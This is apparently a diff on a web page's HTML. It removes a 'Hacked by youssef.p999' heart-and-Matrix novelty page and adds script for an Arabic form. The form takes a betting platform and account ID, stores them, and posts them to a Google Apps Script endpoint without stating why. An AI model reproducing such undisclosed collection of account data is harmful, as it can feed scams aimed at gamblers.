@@ -1,200 +1,101 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>I Love You - by youssef.p999</title>
-  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background: black;
-      overflow: hidden;
-      height: 100vh;
-      font-family: 'Pacifico', cursive;
-    }
+    window.addEventListener("pageshow", (e) => {
+      if (e.persisted) resetForm();
+    });
 
-    canvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-      z-index: 0;
-    }
+    function login() {
+      const platform = document.getElementById("platform").value;
+      const userId = document.getElementById("userId").value.trim();
+      const btn = document.getElementById("submitBtn");
+      const loader = document.getElementById("loader");
+      const label = btn.querySelector(".label");
 
-    .matrix-bg {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      pointer-events: none;
-    }
-
-    .heart {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 120px;
-      height: 110px;
-      background: red;
-      transform: translate(-50%, -50%) rotate(135deg);
-      animation: pulse 1.5s ease-in-out infinite;
-      box-shadow: 0 0 30px red, 0 0 60px crimson;
-      z-index: 2;
-    }
-
-    .heart::before,
-    .heart::after {
-      content: "";
-      position: absolute;
-      width: 120px;
-      height: 110px;
-      background: red;
-      border-radius: 50%;
-    }
-
-    .heart::before {
-      top: -60px;
-      left: 0;
-    }
-
-    .heart::after {
-      left: -60px;
-      top: 0;
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: translate(-50%, -50%) rotate(135deg) scale(1); }
-      50% { transform: translate(-50%, -50%) rotate(135deg) scale(1.1); }
-    }
-
-    .center-text {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 2.8em;
-      color: white;
-      z-index: 3;
-      text-shadow: 0 0 10px #ff69b4, 0 0 25px #ff69b4;
-      pointer-events: none;
-    }
-
-    .typing-text {
-      position: absolute;
-      top: 60%;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 1.3em;
-      color: #00ff00;
-      font-family: 'Courier New', monospace;
-      white-space: nowrap;
-      overflow: hidden;
-      border-right: 2px solid #00ff00;
-      animation: typing 6s steps(40, end), blink .7s step-end infinite;
-      z-index: 3;
-    }
-
-    @keyframes typing {
-      from { width: 0; }
-      to { width: 100%; }
-    }
-
-    @keyframes blink {
-      from, to { border-color: transparent; }
-      50% { border-color: #00ff00; }
-    }
-
-    .footer {
-      position: absolute;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 1.2em;
-      font-family: Arial, sans-serif;
-      color: #fff;
-      z-index: 4;
-    }
-
-    .footer img {
-      width: 22px;
-      height: 22px;
-    }
-
-    .insta-button {
-      background: #e1306c;
-      border: none;
-      color: white;
-      padding: 10px 16px;
-      border-radius: 30px;
-      font-size: 14px;
-      cursor: pointer;
-      margin-top: 10px;
-      text-decoration: none;
-      transition: background 0.3s;
-    }
-
-    .insta-button:hover {
-      background: #c82361;
-    }
-  </style>
-</head>
-<body>
-
-  <!-- Matrix Hacker Code Background -->
-  <canvas class="matrix-bg" id="matrix"></canvas>
-
-  <!-- Glowing Heart -->
-  <div class="heart"></div>
-
-  <!-- Main Text -->
-  <div class="center-text">I love You</div>
-
-  <!-- Typing Effect -->
-  <div class="typing-text">System status: Hacked by youssef.p999 💚</div>
-
-  <!-- Instagram Footer -->
-  <div class="footer">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="IG">
-    <span>youssef.p999</span>
-    <a class="insta-button" href="https://www.instagram.com/youssef.p999" target="_blank">Visit Instagram</a>
-  </div>
-
-  <!-- Matrix JS -->
-  <script>
-    const canvas = document.getElementById("matrix");
-    const ctx = canvas.getContext("2d");
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    const letters = "01 💚 YOU ❤️ HACK 💀 LOVE 💘 💻 💌 youssef.p999".split("");
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-
-    function draw() {
-      ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-      ctx.fillStyle = "#00FF00";
-      ctx.font = fontSize + "px monospace";
-
-      for (let i = 0; i < drops.length; i++) {
-        const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-          drops[i] = 0;
-        }
-        drops[i]++;
+      if (!platform) {
+        showMessage("اختر المنصة.");
+        return;
       }
 
-      requestAnimationFrame(draw);
+      if (!userId) {
+        showMessage("أدخل المعرّف.");
+        return;
+      }
+
+      if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId)) {
+        showMessage("المعرف غير معتمد. الرجاء التحقق.");
+        return;
+      }
+
+      if (isRepeatedDigits(userId)) {
+        showMessage("المعرف غير معتمد. الرجاء التحقق.");
+        return;
+      }
+
+      btn.disabled = true;
+      btn.classList.add("opacity-50", "cursor-not-allowed");
+      loader.classList.remove("hidden");
+      label.classList.add("hidden");
+      document.getElementById("platform").disabled = true;
+      document.getElementById("userId").disabled = true;
+
+      localStorage.setItem("platform", platform);
+      localStorage.setItem("userId", userId);
+
+      fetch("https://script.google.com/macros/s/AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ platform, userId })
+      }).finally(() => {
+        setTimeout(() => {
+          window.location.href = "home.html";
+        }, 800);
+      });
     }
 
-    draw();
+    document.getElementById("oneClickTab").addEventListener("click", () => {
+      document.getElementById("platform").value = "";
+      document.getElementById("selectedText").textContent = "اختر المنصة";
+      document.getElementById("userId").value = "";
+      document.getElementById("message").className = "fade";
+      document.getElementById("message").textContent = "";
+      resetForm();
+    });
+
+    const dropdownBtn = document.getElementById("dropdownBtn");
+    const dropdownList = document.getElementById("dropdownList");
+    const selectedText = document.getElementById("selectedText");
+    const platformInput = document.getElementById("platform");
+
+    dropdownBtn.addEventListener("click", () => {
+      dropdownList.classList.toggle("hidden");
+    });
+
+    document.querySelectorAll(".dropdown-item").forEach(item => {
+      item.addEventListener("click", () => {
+        const value = item.getAttribute("data-value");
+        platformInput.value = value;
+        dropdownList.classList.add("hidden");
+
+        if (value === "Mega pari") {
+          selectedText.innerHTML = `<span>Mega pari</span><img src="https://i.postimg.cc/rpcLHHcP/recharge.png" alt="Mega pari" class="w-6 h-6 rounded-full ml-2">`;
+        } else if (value === "Linbet") {
+          selectedText.innerHTML = `<span>Linbet</span><img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full ml-2">`;
+        } else if (value === "Gooobet") {
+          selectedText.innerHTML = `<span>Gooobet</span><img src="https://i.postimg.cc/kXwF06xF/recharge.webp" alt="Gooobet" class="w-6 h-6 rounded-full ml-2">`;
+        } else if (value === "1xbet") {
+          selectedText.innerHTML = `<span>1xbet</span><img src="https://i.postimg.cc/yx8Wcdks/recharge.jpg" alt="1xbet" class="w-6 h-6 rounded-full ml-2">`;
+        } else if (value === "Melbet") {
+          selectedText.innerHTML = `<span>Melbet</span><img src="https://i.postimg.cc/JzVMW0M0/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full ml-2">`;
+        } else {
+          selectedText.textContent = value;
+        }
+      });
+    });
+
+    window.addEventListener("click", function(e) {
+      if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
+        dropdownList.classList.add("hidden");
+      }
+    });
   </script>
 </body>
 </html>
